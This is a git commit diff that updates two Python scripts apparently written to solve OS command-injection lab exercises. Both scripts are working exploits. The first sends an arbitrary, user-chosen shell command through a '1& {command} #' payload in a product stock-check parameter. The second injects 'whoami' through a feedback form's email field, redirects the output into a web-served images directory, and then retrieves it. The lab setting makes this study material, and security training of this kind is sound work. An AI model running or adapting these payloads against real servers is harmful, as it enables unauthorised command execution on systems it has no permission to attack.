c75fb425ffc16cf481d4acf86fbc98498f9fc892
nicotitta <tittarellinico@gmail.com>
2025-09-18 12:00:24 +0200

    Update command-injection scripts, add new script

--- Command-Injection/Scripts/command-injection-lab-01.py
+++ Command-Injection/Scripts/command-injection-lab-01.py
@@ -11,30 +11,34 @@ proxies = {
     "https": "http://127.0.0.1:8080"
 }
 
-def command_injection(url):
-    payload = "& whoami #&"
+def command_injection(url, command):
+    injection = f'1& {command} #'
+    print(injection)
     myData = {
-        'productId':'1'+payload,
+        'productId':injection,
         'storeId':'1'
     }
-    r = requests.post(url, data=myData, verify=False, proxies=proxies)
-    return r.text
+    # In the URL product/stock is need in order to mimic the exact same request
+    r = requests.post(url+'product/stock', data=myData, verify=False, proxies=proxies)
+    if(len(r.text) > 3):
+        print("(+) OS command injection was successful")
+        print(f'(+) Output of the command: {r.text}')
+        return True
+    else:
+        print("(-) OS command injection failed")
+        return False
 
 
 def main():
-    if len(sys.argv) != 2:
-        print("(+) Usage: python3 %s <url>" % sys.argv[0])
-        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
+    if len(sys.argv) != 3:
+        print("(+) Usage: python3 %s <url> <command>" % sys.argv[0])
+        print("(+) Example: python3 %s www.example.com whoami" % sys.argv[0])
         return
 
     url = sys.argv[1]
+    command = sys.argv[2]
     print("Injecting OS command...")
-    username = command_injection(url)
-    if username:
-        print("(+) OS command injection was successful")
-        print(f"(+) Name of the current user: {username}")
-    else:
-        print("(-) OS command injection failed")
+    command_injection(url, command)
 
 if __name__ == "__main__":
     main()
--- Command-Injection/Scripts/command-injection-lab-03.py
+++ Command-Injection/Scripts/command-injection-lab-03.py
@@ -12,7 +12,6 @@ proxies = {
     "https": "http://127.0.0.1:8080"
 }
 
-
 def get_csrf(s, url):
     r = s.get(url, verify=False, proxies=proxies)
     soup = BeautifulSoup(r.text, 'html.parser')
@@ -20,9 +19,10 @@ def get_csrf(s, url):
     return csrf
 
 
-def blind_os_command_injection(s, url):
+def blind_os_command_injection(s, url, fileName):
     feedback_path = "feedback/submit"
-    payload = "test@test.com & ping -c 12 127.0.0.1 #"
+    images_path = f'image?filename={fileName}'
+    payload = f'test@test.com & whoami > /var/www/images/{fileName} #'
     csrf_url = "feedback"
     csrf = get_csrf(s, url+csrf_url)
     myData = {
@@ -32,27 +32,32 @@ def blind_os_command_injection(s, url):
         'subject':'test',
         'message':'test'
     }
+
+    # Perform the redirection here
     r = s.post(url+feedback_path, data=myData, verify=False, proxies=proxies)
     
-    if int(r.elapsed.total_seconds()) > 9:
+    # Get the output of the file
+    r2 = s.get(url+images_path, verify=False, proxies=proxies)
+    if(len(r2.text) > 3):
+        print("(+) OS command injection was successful")
+        print(f'(+) Output of the command: {r2.text}')
         return True
     else:
+        print("(-) OS command injection failed")
         return False
 
 
 def main():
-    if len(sys.argv) != 2:
-        print("(+) Usage: python3 %s <url>" % sys.argv[0])
+    if len(sys.argv) != 3:
+        print("(+) Usage: python3 %s <url> <fileName>" % sys.argv[0])
         print("(+) Example: python3 %s www.example.com" % sys.argv[0])
         return
 
     url = sys.argv[1]
-    print("Injecting OS command...")
+    outputFile = sys.argv[2]
+    print("Injecting OS command with output redirection...")
     s = requests.Session()
-    if blind_os_command_injection(s,url):
-        print("(+) OS command injection was successful")
-    else:
-        print("(-) OS command injection failed")
+    blind_os_command_injection(s,url, outputFile)
 
 if __name__ == "__main__":
     main()
